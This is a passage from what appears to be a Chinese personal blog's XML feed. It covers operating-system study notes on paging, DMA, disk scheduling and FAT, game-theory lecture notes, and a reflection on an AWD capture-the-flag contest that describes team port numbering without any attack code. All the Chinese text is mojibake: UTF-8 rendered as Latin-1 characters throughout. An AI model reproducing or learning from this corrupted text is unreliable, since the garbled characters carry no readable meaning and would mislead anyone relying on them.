å…ˆè¿›å…ˆå‡ºé¡µé¢ç½®æ¢ç®—æ³•</h3><p>æ€»æ·˜æ±°æœ€å…ˆè¿›å…¥çš„ï¼ˆé©»ç•™æœ€ä¹…çš„ï¼‰</p><h3 id="LRU-Least-Recent-Used-æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨"><a href="#LRU-Least-Recent-Used-æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨" class="headerlink" title="LRU (Least Recent Used) æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨"></a>LRU (Least Recent Used) æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨</h3><p>é€‰æ‹©æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢</p><p>LRUå’ŒOPTï¼ŒåŠ ç‰©ç†å—æ•°ä¸ä¼šå¢åŠ ç¼ºé¡µæ¬¡æ•°ï¼ŒFIFOä¸ä¸€å®šèƒ½å‡å°‘ç¼ºé¡µæ¬¡æ•°</p><h2 id="æŠ–åŠ¨"><a href="#æŠ–åŠ¨" class="headerlink" title="æŠ–åŠ¨"></a>æŠ–åŠ¨</h2><h3 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h3><p>è¿è¡Œçš„è¿›ç¨‹å¤ªå¤šï¼Œé¢‘ç¹å‡ºæ–°ç¼ºé¡µï¼Œè¿›ç¨‹å¤§éƒ¨åˆ†æ—¶é—´éƒ½ç”¨äºé¡µé¢çš„æ¢è¿›æ¢å‡º</p><h3 id="é¢„é˜²"><a href="#é¢„é˜²" class="headerlink" title="é¢„é˜²"></a>é¢„é˜²</h3><ul><li>å±€éƒ¨ç½®æ¢ç­–ç•¥    åªåœ¨åˆ†é…ç»™è‡ªå·±çš„å†…å­˜ä¸­ç½®æ¢</li></ul><h2 id="è¯·æ±‚åˆ†æ®µå‚¨å­˜ç®¡ç†"><a href="#è¯·æ±‚åˆ†æ®µå‚¨å­˜ç®¡ç†" class="headerlink" title="è¯·æ±‚åˆ†æ®µå‚¨å­˜ç®¡ç†"></a>è¯·æ±‚åˆ†æ®µå‚¨å­˜ç®¡ç†</h2><h3 id="å…±äº«æ®µè¡¨"><a href="#å…±äº«æ®µè¡¨" class="headerlink" title="å…±äº«æ®µè¡¨"></a>å…±äº«æ®µè¡¨</h3><h3 id="åˆ†æ®µä¿æŠ¤"><a href="#åˆ†æ®µä¿æŠ¤" class="headerlink" title="åˆ†æ®µä¿æŠ¤"></a>åˆ†æ®µä¿æŠ¤</h3><ul><li>è¶Šç•Œæ£€æŸ¥</li><li>å­˜å–æ§åˆ¶æ£€æŸ¥</li><li>ç¯ä¿æŠ¤æœºæ„ ç±»ä¼¼ç³»ç»Ÿçš„å†…æ ¸ç­‰çº§</li></ul><h2 id="I-OåŸºæœ¬åŠŸèƒ½"><a href="#I-OåŸºæœ¬åŠŸèƒ½" class="headerlink" title="I/OåŸºæœ¬åŠŸèƒ½"></a>I/OåŸºæœ¬åŠŸèƒ½</h2><ul><li>æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨</li><li>æé«˜CPUå’ŒIOè®¾å¤‡åˆ©ç”¨ç‡</li><li>å…±äº«è®¾å¤‡æ—¶æä¾›æ–¹ä¾¿</li></ul><h2 id="ä¸­æ–­å¤„ç†ç¨‹åº"><a href="#ä¸­æ–­å¤„ç†ç¨‹åº" class="headerlink" title="ä¸­æ–­å¤„ç†ç¨‹åº"></a>ä¸­æ–­å¤„ç†ç¨‹åº</h2><ul><li>æµ‹å®šæ˜¯å¦æœ‰æœªå“åº”çš„ä¸­æ–­ä¿¡å·</li><li>ä¿æŠ¤è¢«ä¸­æ–­è¿›ç¨‹çš„CPUç¯å¢ƒ</li><li>è½¬å…¥ç›¸åº”çš„è®¾å¤‡å¤„ç†ç¨‹åº</li><li>ä¸­æ–­å¤„ç†</li><li>æ¢å¤CPUç°åœºå¹¶é€€å‡ºä¸­æ–­</li></ul><p>å›¾p206</p><h2 id="DMAæ§åˆ¶å™¨"><a href="#DMAæ§åˆ¶å™¨" class="headerlink" title="DMAæ§åˆ¶å™¨"></a>DMAæ§åˆ¶å™¨</h2><h3 id="ä¸»æœº-æ§åˆ¶å™¨æ¥å£"><a href="#ä¸»æœº-æ§åˆ¶å™¨æ¥å£" class="headerlink" title="ä¸»æœº-æ§åˆ¶å™¨æ¥å£"></a>ä¸»æœº-æ§åˆ¶å™¨æ¥å£</h3><ul><li>DR æ•°æ®å¯„å­˜å™¨</li><li>MAR å†…å­˜åœ°å€å¯„å­˜å™¨</li><li>DC æ•°æ®è®¡æ•°å™¨</li><li>CR å‘½ä»¤/çŠ¶æ€å¯„å­˜å™¨</li></ul><p>DCï¼ŒMARï¼ŒCRè·å¾—ä»CPUä¼ æ¥çš„æ•°æ®å’Œå‘½ä»¤ï¼ŒDRè·å–æ•°æ®ï¼Œå¹¶ä¼ å…¥MAR</p><p>è®¾ç½®MARå’ŒDCåˆå€¼ -&gt; å¯åŠ¨DMA -&gt; ä½¿ç”¨å­˜å‚¨å™¨å‘¨æœŸä¼ é€æ•°æ® -&gt; å­˜å‚¨å™¨åœ°å€+1ï¼ŒDC-1 -&gt; å¾ªç¯</p><p>è‹¥DC = 0 è¯·æ±‚ä¸­æ–­</p><h2 id="ä¸è®¾å¤‡æ— å…³IO"><a href="#ä¸è®¾å¤‡æ— å…³IO" class="headerlink" title="ä¸è®¾å¤‡æ— å…³IO"></a>ä¸è®¾å¤‡æ— å…³IO</h2><ul><li>ä»¥ç‰©ç†è®¾å¤‡åä½¿ç”¨è®¾å¤‡     ä¸çµæ´»ï¼Œåˆ©ç”¨ç‡ä¹Ÿä¸é«˜</li><li>é€»è¾‘è®¾å¤‡å </li></ul><h3 id="è®¾å¤‡æ§åˆ¶è¡¨DCT"><a href="#è®¾å¤‡æ§åˆ¶è¡¨DCT" class="headerlink" title="è®¾å¤‡æ§åˆ¶è¡¨DCT"></a>è®¾å¤‡æ§åˆ¶è¡¨DCT</h3><ul><li>è®¾å¤‡ç±»å‹</li><li>è®¾å¤‡æ ‡å¿—ç¬¦</li><li>è®¾å¤‡çŠ¶æ€</li><li>æŒ‡å‘æ§åˆ¶å™¨è¡¨çš„æŒ‡é’ˆ</li><li>é‡å¤æ‰§è¡Œæ¬¡æ•°æˆ–æ—¶é—´</li><li>è®¾å¤‡é˜Ÿåˆ—çš„é˜Ÿé¦–æŒ‡é’ˆ</li></ul><h3 id="æ§åˆ¶å™¨æ§åˆ¶è¡¨COCT"><a href="#æ§åˆ¶å™¨æ§åˆ¶è¡¨COCT" class="headerlink" title="æ§åˆ¶å™¨æ§åˆ¶è¡¨COCT"></a>æ§åˆ¶å™¨æ§åˆ¶è¡¨COCT</h3><p>è®°å½•æ§åˆ¶å™¨æƒ…å†µ</p><h3 id="LUT-Logical-Unit-Table-é€»è¾‘è®¾å¤‡è¡¨"><a href="#LUT-Logical-Unit-Table-é€»è¾‘è®¾å¤‡è¡¨" class="headerlink" title="LUT (Logical Unit Table) é€»è¾‘è®¾å¤‡è¡¨"></a>LUT (Logical Unit Table) é€»è¾‘è®¾å¤‡è¡¨</h3><p>é€»è¾‘è®¾å¤‡å | ç‰©ç†è®¾å¤‡å | é©±åŠ¨ç¨‹åºå…¥å£åœ°å€</p><p>/dev/tty      |  3                |  1024</p><p>é€»è¾‘è®¾å¤‡è¡¨ | ç³»ç»Ÿè®¾å¤‡è¡¨æŒ‡é’ˆ</p><p>/dev/tty.     |    3</p><h2 id="ç¼“å†²"><a href="#ç¼“å†²" class="headerlink" title="ç¼“å†²"></a>ç¼“å†²</h2><p>CPUå’ŒIOè®¾å¤‡é€Ÿåº¦ä¸åŒ¹é…</p><p>åˆ©ç”¨ç¼“å†²å¯„å­˜å™¨æš‚å­˜æ•°æ®</p><h2 id="ç£ç›˜è°ƒåº¦ç®—æ³•"><a href="#ç£ç›˜è°ƒåº¦ç®—æ³•" class="headerlink" title="ç£ç›˜è°ƒåº¦ç®—æ³•"></a>ç£ç›˜è°ƒåº¦ç®—æ³•</h2><h3 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h3><h3 id="SSTF-Shortest-Search-Time-First-æœ€çŸ­å¯»é“æ—¶é—´ä¼˜å…ˆ"><a href="#SSTF-Shortest-Search-Time-First-æœ€çŸ­å¯»é“æ—¶é—´ä¼˜å…ˆ" class="headerlink" title="SSTF (Shortest Search Time First) æœ€çŸ­å¯»é“æ—¶é—´ä¼˜å…ˆ"></a>SSTF (Shortest Search Time First) æœ€çŸ­å¯»é“æ—¶é—´ä¼˜å…ˆ</h3><h2 id="åŸºäºæ‰«æçš„ç£ç›˜è°ƒåº¦"><a href="#åŸºäºæ‰«æçš„ç£ç›˜è°ƒåº¦" class="headerlink" title="åŸºäºæ‰«æçš„ç£ç›˜è°ƒåº¦"></a>åŸºäºæ‰«æçš„ç£ç›˜è°ƒåº¦</h2><h3 id="SCAN-æ‰«æç®—æ³•-åˆç§°ç”µæ¢¯è°ƒåº¦ç®—æ³•"><a href="#SCAN-æ‰«æç®—æ³•-åˆç§°ç”µæ¢¯è°ƒåº¦ç®—æ³•" class="headerlink" title="SCAN æ‰«æç®—æ³• åˆç§°ç”µæ¢¯è°ƒåº¦ç®—æ³•"></a>SCAN æ‰«æç®—æ³• åˆç§°ç”µæ¢¯è°ƒåº¦ç®—æ³•</h3><p>è¦è®¿é—®çš„ç£é“ä¸åˆºå¤´å½“å‰è·ç¦»è¾ƒè¿‘</p><h2 id="æ–‡ä»¶ç»“æ„"><a href="#æ–‡ä»¶ç»“æ„" class="headerlink" title="æ–‡ä»¶ç»“æ„"></a>æ–‡ä»¶ç»“æ„</h2><p>æ–‡ä»¶é€»è¾‘ç»“æ„</p><p>æ–‡ä»¶ç”±ä¸€ç³»åˆ—é€»è¾‘è®°å½•ç»„æˆï¼Œæ˜¯å¯ä»¥ç›´æ¥å¤„ç†çš„æ•°æ®åŠå…¶ç»“æ„ï¼Œç‹¬ç«‹äºæ–‡ä»¶çš„ç‰©ç†ç‰¹æ€§ï¼Œåˆç§°æ–‡ä»¶ç»„ç»‡</p><p>ç‰©ç†ç»“æ„</p><p>å¯¹ç£ç›˜ç®¡ç†å™¨çš„è¦æ±‚</p><ul><li>æœ‰æ•ˆåœ°åˆ©ç”¨å­˜å‚¨ç©ºé—´</li><li>æé«˜ç£ç›˜IOé€Ÿç‡</li><li>æé«˜ç£ç›˜ç³»ç»Ÿå¯é æ€§</li></ul><p>å¤–å­˜ç»„ç»‡æ–¹å¼</p><ul><li>è¿ç»­</li><li>é“¾æ¥</li><li>ç´¢å¼•</li></ul><h2 id="é“¾æ¥ç»„ç»‡æ–¹å¼"><a href="#é“¾æ¥ç»„ç»‡æ–¹å¼" class="headerlink" title="é“¾æ¥ç»„ç»‡æ–¹å¼"></a>é“¾æ¥ç»„ç»‡æ–¹å¼</h2><p>æ˜¾å¼ è¡¨ä¸­æ”¾æŒ‡é’ˆï¼Œé“¾è¡¨ã€éšå¼ é“¾è¡¨</p><h2 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h2><p>åˆ†æˆå·</p><p>ä¸€ä¸ªç£ç›˜å¯å¤šä¸ªå·ï¼Œä¸€ä¸ªå·å¯ç”±å¤šä¸ªç£ç›˜ç»„æˆ</p><p>æ–‡ä»¶ç¬¬ä¸€ä¸ªç›˜å·æ”¾åœ¨FCBä¸­ï¼ŒFATæ¯ä¸ªè¡¨é¡¹æœ€åæ”¾ä¸‹ä¸€ä¸ªç›˜å—å·</p><h3 id="ç°‡"><a href="#ç°‡" class="headerlink" title="ç°‡"></a>ç°‡</h3><p>æ˜¯ä¸€ç»„ç›¸é‚»çš„ä¸Šå»ï¼Œä½œä¸ºè™šæ‹Ÿæ‰‡åŒºã€‚ç›˜å—åˆ†é…æ—¶ä»¥ç°‡ä¸ºåŸºæœ¬å•ä½</p><p>å¥½å¤„ï¼šèƒ½é€‚åº”ç£ç›˜å®¹é‡ä¸æ–­å¢å¤§çš„æƒ…å†µï¼Œè¿˜å¯å‡å°‘FATè¡¨ä¸­é¡¹æ•°</p><h2 id="æ–‡ä»¶å‚¨å­˜ç©ºé—´ç®¡ç†"><a href="#æ–‡ä»¶å‚¨å­˜ç©ºé—´ç®¡ç†" class="headerlink" title="æ–‡ä»¶å‚¨å­˜ç©ºé—´ç®¡ç†"></a>æ–‡ä»¶å‚¨å­˜ç©ºé—´ç®¡ç†</h2><h3 id="ç©ºé—²è¡¨æ³•"><a href="#ç©ºé—²è¡¨æ³•" class="headerlink" title="ç©ºé—²è¡¨æ³•"></a>ç©ºé—²è¡¨æ³•</h3><p>ç»™æ¯ä¸ªæ–‡ä»¶åˆ†é…è¿ç»­å­˜å‚¨ç©ºé—´ã€‚</p><p>ç³»ç»Ÿä¹Ÿä¼šä¸ºå¤–å­˜ç©ºé—²åŒºå»ºç«‹ç©ºé—²è¡¨</p><h3 id="ä½è§†å›¾æ³•"><a href="#ä½è§†å›¾æ³•" class="headerlink" title="ä½è§†å›¾æ³•"></a>ä½è§†å›¾æ³•</h3><p>äºŒä½æ•°ç»„æ¨¡æ ·ï¼Œm*n=ç£ç›˜æ€»å—æ•°</p>]]></content>
    
    
    <categories>
      
      <category>ä¸“ä¸šå­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¸“ä¸šå­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åšå¼ˆè®º</title>
    <link href="/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/"/>
    <url>/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/av41333177?p=2">LINK</a><br>ã€Šåšå¼ˆåœ£ç»ã€‹åšå¼ˆè®ºçš„å®šä¹‰ï¼šæˆ‘ä»¬æŠŠåŠ¨ç‰©åˆ©ç”¨å¤§è‡ªç„¶ç§»åŠ¨çš„ç˜¾é­‚ï¼Œåœ¨å†³ç­–äººæœŸå¾…çš„ç©ºé—´é‡Œï¼Œå½¢æˆä¸‰ç»´å‡è¡¡çš„å­¦æœ¯ç†è®ºï¼Œç§°ä¸ºåšå¼ˆè®ºã€‚<br>åŸºæœ¬æ¦‚å¿µä¸­åŒ…æ‹¬å±€ä¸­äººã€è¡ŒåŠ¨ã€ä¿¡æ¯ã€ç­–ç•¥ã€æ”¶ç›Šã€å‡è¡¡å’Œç»“æœç­‰ã€‚å…¶ä¸­å±€ä¸­äººã€ç­–ç•¥å’Œæ”¶ç›Šæ˜¯æœ€åŸºæœ¬è¦ç´ ã€‚å±€ä¸­äººã€è¡ŒåŠ¨å’Œç»“æœè¢«ç»Ÿç§°ä¸ºåšå¼ˆè§„åˆ™ã€‚</p><h2 id="Class1"><a href="#Class1" class="headerlink" title="Class1"></a>Class1</h2><p><em>å®šä¹‰ï¼šå¦‚æœä¸€ä¸ªé€‰é¡¹å¾—åˆ°çš„ç»“æœä¸¥æ ¼ä¼˜äºå¦ä¸€ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆç§°è¿™ä¸ªé€‰é¡¹ä¸ºä¸¥æ ¼ä¼˜åŠ¿ç­–ç•¥ã€‚</em></p><p><strong>ç»“è®º1ï¼šä¸è¦é€‰æ‹©ä¸¥æ ¼åŠ£åŠ¿ç­–ç•¥</strong></p><p><strong>ç»“è®º2ï¼šç†æ€§çš„é€‰æ‹©ï¼Œä½¿å¾—æ€»ç»“æœå˜å¾—æ›´å</strong></p><p>æ”¹å˜æ”¶ç›Šï¼Œå°±ä¼šæ”¹å˜ç›®çš„ã€‚</p><p><strong>ç»“è®º3ï¼šäºˆæ¬²å¾—ä¹‹ï¼Œå¿…å…ˆçŸ¥ä¹‹</strong></p><p>ç»“è®º4ï¼šåˆ†æä»–ä»¬ï¼ˆå¯¹æ‰‹ï¼‰çš„æ”¶ç›Šï¼Œç«™åœ¨åˆ«äººçš„ç«‹åœºä¸Šå»åˆ†æä»–ä»¬ä¼šæ€ä¹ˆåš</p><blockquote><p>2019/8/6</p></blockquote><hr><h2 id="Class2"><a href="#Class2" class="headerlink" title="Class2"></a>Class2</h2><p>åšå¼ˆçš„è¦ç´ ï¼šå‚ä¸äººï¼ˆi,jï¼‰ã€ç­–ç•¥ï¼ˆsi,Siç­–ç•¥é›†åˆï¼ŒsæŸä¸€æ¬¡åšå¼ˆï¼‰ã€æ”¶ç›Šï¼ˆUï¼ŒUi(s)ï¼‰</p><p>s-i:é™¤äº†iä»¥å¤–å…¶ä»–å‚ä¸äººæ¯äººçš„ç­–ç•¥</p><table><thead><tr><th align="left">1/2</th><th align="left">L</th><th align="left">C</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">T</td><td align="left">5,-1</td><td align="left">11,3</td><td align="left">0,0</td></tr><tr><td align="left">B</td><td align="left">6,4</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p>S1={T,B} S2={L,C,R}</p><p>U1(T,C)=11 U2(Tï¼ŒC)=3</p><p>å®šä¹‰ï¼šå‚ä¸äººiçš„ç­–ç•¥sâ€™iä¸¥æ ¼åŠ£äºå¦ä¸€ä¸ªç­–ç•¥siï¼Œåœ¨å…¶ä»–äººé€‰æ‹©s-iæ—¶ï¼Œé€‰æ‹©siçš„æ”¶ç›ŠUIä¸¥æ ¼ä¼˜äºæ­¤æƒ…å†µä¸‹é€‰æ‹©sâ€™içš„æ”¶ç›ŠUI</p><table><thead><tr><th align="left">De/Attach</th><th align="left">ez</th><th align="left">hard</th></tr></thead><tbody><tr><td align="left">E</td><td align="left">1,1</td><td align="left">1,1</td></tr><tr><td align="left">H</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p><strong><em>å®šä¹‰ï¼šå‚ä¸è€…içš„ç­–ç•¥sâ€™iï¼Œå¼±åŠ£äºç­–ç•¥siå½“ä¸”ä»…å½“åœ¨å¯¹æ‰‹é€‰æ‹©s-içš„æƒ…å†µä¸‹ï¼Œå‚ä¸äººié€‰æ‹©siçš„æ”¶ç›Šç­‰äºå¯¹æ‰‹é€‰s-iä¸‹ä»–é€‰sâ€™içš„æ”¶ç›Šï¼Œè€Œä¸”åœ¨ä»»ä½•æƒ…å†µä¸‹å‡æˆç«‹ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¯¹æ‰‹é€‰s-iå‚ä¸è€…çš„içš„ç­–ç•¥siï¼Œä¸¥æ ¼ä¼˜äºå…¶ä»–ç­–ç•¥sâ€™iï¼Œè‡³å°‘åœ¨æŸç§æƒ…å†µä¸‹æˆç«‹\</em></strong>ï¼ˆå‚ä¸è€…içš„ç­–ç•¥sâ€™iå¼±åŠ£äºç­–ç•¥siï¼Œå½“ä¸”ä»…å½“æ— è®ºå¯¹æ‰‹æ€ä¹ˆåšï¼Œä»–é€‰æ‹©siçš„æ”¶ç›Šè‡³å°‘ä¸é€‰æ‹©sâ€˜içš„ç›¸ç­‰ï¼Œæœ‰äº›æƒ…å†µç”šè‡³æ˜¯ä¸¥æ ¼å ä¼˜çš„ï¼‰</p><p>å…±åŒçŸ¥è¯†ï¼šæˆ‘çŸ¥é“ä¸€ä¸ªäº‹æƒ…ï¼Œä½ ä¹ŸçŸ¥é“è¿™ä»¶äº‹ï¼Œæˆ‘çŸ¥é“ä½ çŸ¥é“ï¼Œä½ çŸ¥é“æˆ‘çŸ¥é“â€¦â€¦</p><p>ç›¸äº’çŸ¥è¯†ä¸æ˜¯å…±åŒçŸ¥è¯†ï¼Œå…±åŒçŸ¥è¯†å®šä¹‰å¾ˆä¸¥æ ¼ã€‚</p><blockquote><p>2019/8/7</p></blockquote><hr><h2 id="Class-3"><a href="#Class-3" class="headerlink" title="Class 3"></a>Class 3</h2><p>è¿­ä»£å‰”é™¤åŠ£åŠ¿ç­–ç•¥ï¼šæ£æµ‹å¯¹æ‰‹æ„å›¾ï¼Œæ£æµ‹å¯¹æ‰‹çŸ¥é“æˆ‘ä»¬çš„æ„å›¾</p><p>å•†ä¸šä¼šé›†ä¸­è·å¾—é™„è¿‘å®¢æº</p><p>==ç¬¬ä¸‰ç«é€‰è€…å¦‚ä½•å½±å“é€‰ä¸¾ç»“æœ?==</p><p>æœ€ä½³å¯¹ç­–ï¼šæœ€å¤§åŒ–é¢„æœŸæ”¶ç›Š</p><p><a href="https://i.loli.net/2019/08/10/g9hIt6PSRsxrcul.png"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA/g9hIt6PSRsxrcul.png" alt="Class 3 ç”»å›¾"></a></p><p>ç”»å›¾ç”¨æ•°æ®è§£é‡Šæ¯”è¾ƒå¥½</p><blockquote><p>2019/8/8</p></blockquote><hr><h2 id="Class4"><a href="#Class4" class="headerlink" title="Class4"></a>Class4</h2><table><thead><tr><th align="left">F/D</th><th align="left">L</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">L</td><td align="left">4.-4</td><td align="left">9,-9</td></tr><tr><td align="left">M</td><td align="left">6,-6</td><td align="left">6,-6</td></tr><tr><td align="left">R</td><td align="left">9,-9</td><td align="left">4,-4</td></tr></tbody></table><p><a href="https://i.loli.net/2019/08/10/3XoNK7aLYSU5VTM.png"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA/3XoNK7aLYSU5VTM.png" alt="Class4 å¦ä¸€ç§ç”»å›¾æ–¹æ³•"></a></p><p>ä¸è¦é€‰æ‹©ä¸€ä¸ªä»»ä½•é€‰æ‹©ä¸‹éƒ½éæœ€ä½³å¯¹ç­–çš„ç­–ç•¥ã€‚</p><p><strong><em>æœ€ä½³å¯¹ç­–ï¼šå‚ä¸äººiçš„ç­–ç•¥Siï¼Œæ˜¯ä¸€ä¸ªæœ€ä½³å¯¹ç­–ï¼ˆBRï¼‰ï¼Œæ˜¯å¯¹æ‰‹çš„ç­–ç•¥S-içš„æœ€ä½³å¯¹ç­–ã€‚å¦‚æœå‚ä¸äººiåœ¨å¯¹æ‰‹çš„s-iç­–ç•¥ä¸‹ï¼Œé€‰Siçš„æ”¶ç›Šå¼±ä¼˜äºå¯¹æ‰‹çš„å…¶ä»–ç­–ç•¥Siâ€™\</em></strong></p><p><strong><em>æœ€ä½³å¯¹ç­–ï¼šSiæ»¡è¶³æ‰€æœ‰æƒ…å†µä¸­ï¼Œæœ€å¤§åŒ–äº†å¯¹æ‰‹é€‰S-iæ—¶æˆ‘çš„æ”¶ç›Š\</em></strong></p><p>åˆä¼™äººï¼šä¸¤ä¸ªå®ä½“å…±åŒå®Œæˆä¸€ä¸ªåä½œé¡¹ç›®ï¼Œå¹¶ä¸”å¹³åˆ†åˆ©æ¶¦</p><p>å¤–éƒ¨æ€§ï¼šæˆ‘çš„åŠªåŠ›ä¸ä»…å¯¹æˆ‘æœ‰åˆ©ï¼Œå¯¹ä½ ä¹Ÿæœ‰åˆ©</p><p>çº³ä»€å‡è¡¡ï¼šæ²¡äººæƒ³é€‰æ‹©å…¶ä»–ç­–ç•¥ï¼Œåœ¨è¿™ä¸ªç‚¹ï¼Œäº’ç›¸éƒ½é‡‡ç”¨çš„æ˜¯æœ€ä½³ç­–ç•¥</p><blockquote><p>2019/8/9</p></blockquote><p><strong><em>æœªå®Œå¾…ç»­\</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>è¯¾å¤–å­¦ä¹ </category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰æ´µæ¯çº¿ä¸‹AWDæ€»ç»“</title>
    <link href="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/"/>
    <url>/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/image-20191210210716136.png" class="" title="image-20191210210716136"><img src="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/95038C770B129D8AE642F53530CAB33B.jpg" class="" title="img"><h2 id="äº‹åBB"><a href="#äº‹åBB" class="headerlink" title="äº‹åBB"></a>äº‹åBB</h2><p>==èµ›å‰è‡ªåŠ¨æäº¤flagè„šæœ¬æ²¡æœ‰ï¼Œè‡ªåŠ¨åŒ–æ‰“å…¨åœºè„šæœ¬æ²¡æœ‰ï¼Œå“ã€‚==</p><p>çº¿ä¸‹è¿˜æ˜¯å¾ˆå‹å¥½çš„ï¼Œå¯ä»¥è¿æ¥å¤–ç½‘ï¼Œä¼™é£Ÿä¹Ÿå¾ˆä¸é”™ï¼Œä½†æ˜¯ï¼</p><p><strong>åªæœ‰å…ˆé»‘ç›’æµ‹è¯•è¿‡äº†è‡ªå·±çš„ï¼Œæ‹¿äº†flagå¹¶æäº¤äº†ä¹‹åï¼Œæ‰å¯ä»¥æ‰¾ä¸»åŠæ–¹è¦sshå¯†ç =ã€‚=å¹¶ä¸”AWDåªæœ‰1é“pwné¢˜ï¼Œ3ä¸ªwebé¢˜ï¼ŒåŸŸæ¸—é€éƒ¨åˆ†å°±æ›´ä¸å¿…å¤šè¯´äº†ï¼Œéƒ½æ˜¯webï¼Œå“</strong></p><h2 id="AWDè§„åˆ™"><a href="#AWDè§„åˆ™" class="headerlink" title="AWDè§„åˆ™"></a>AWDè§„åˆ™</h2><p>è¿æ¥çš„æ˜¯dockeræœåŠ¡å™¨ï¼Œæ‰€ä»¥ç»™çš„éƒ½æ˜¯ç«¯å£</p><p>ç«¯å£åˆ—è¡¨ï¼šaxx80/axx22 </p><ul><li>eg: team01-web1 10180(web) 10122(ssh) </li><li>eg: team18-web2 11880(web) 11822(ssh) </li><li>eg: team19-web3 30180(web) 30122(ssh) </li><li>eg: team01-pwn1 40180(pwn) 40122(ssh)</li></ul><p>==æ¯”å¦‚æˆ‘æ‹¿åˆ°çš„pwnç«¯å£æ˜¯40980ï¼Œé‚£ä¹ˆåˆ«äººçš„å°±æ˜¯4xx80ï¼Œ40080ç«¯å£åˆ°41780ç«¯å£ï¼Œå†™æ‰“å…¨åœºè„šæœ¬å°±è¿™æ ·æŒ¨ä¸ªç«¯å£æ‰“è¿‡å»==</p><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>å¼€å±€å¥½ä¹…éƒ½æ˜¯è’™è”½çŠ¶æ€ï¼Œä¸çŸ¥é“ipï¼Œä¸çŸ¥é“ç«¯å£ï¼Œ<strong>ä½†å…¶å®è¿™äº›éƒ½åœ¨ç¾¤é‡Œå‘çš„çº¿ä¸‹èµ›è¯´æ˜ä¸­åŒ…å«æœ‰ï¼Œéœ€è¦æ³¨æ„å»çœ‹QAQ</strong></p><p>æœ‰ç©ºäº†æˆ‘å°±æ‰¾æ‰¾çœ‹çœ‹å†™å†™è‡ªåŠ¨åŒ–æäº¤å’Œå¤šè¿›ç¨‹æ‰“å…¨åœºè„šæœ¬QAQ</p><p>pwnçš„è¯ï¼Œå°±ä¸“å¿ƒåšï¼Œæ‰“é€šäº†ï¼Œè‡ªå·±çš„è¿™è¾¹çš„è¯å°±ä¿®æ”¹ä¸€ä¸‹æ ˆçš„ä½ç½®ï¼ŸæŒªä¸€ä¸‹æ ˆä»€ä¹ˆçš„ï¼Œæ‰“ä¸ªpatchå°±å¥½äº†= =ï¼ˆå½“ç„¶æˆ‘è¿˜æ²¡è¯•è¿‡ï¼Œæ…¢æ…¢å­¦ä¹ .jpgï¼‰</p><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><p><a href="https://xz.aliyun.com/t/3607">AWDäºŒè¿›åˆ¶è¿ç»´å·¥å…·</a></p><p><a href="https://www.cnblogs.com/work115/p/5621789.html">pythonä¹‹å¤šè¿›ç¨‹</a>-å› ä¸ºå¬å—æ¢¦è¯´å¤šçº¿ç¨‹å®¹æ˜“å´©</p><p><a href="https://www.cnblogs.com/xiao-apple36/p/9144092.html">Pythonæ¨¡å—å­¦ä¹  - Paramiko</a></p><p>å¹¸å¥½æ–°è‹—æ²¡ä¸­ï¼Œå¯ä»¥ä¸“å¿ƒæpwnäº†å“</p><p>å‘å—æ¢¦å¤§ä½¬å­¦ä¹ ï¼Œ<a href="https://196011564.github.io/">link</a></p>]]></content>
    
    
    <categories>
      
      <category>åæ€æ€»ç»“</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pythonä¸­ä¸‹åˆ’çº¿çš„5ç§å«ä¹‰</title>
    <link href="/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/"/>
    <url>/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/</url>
    
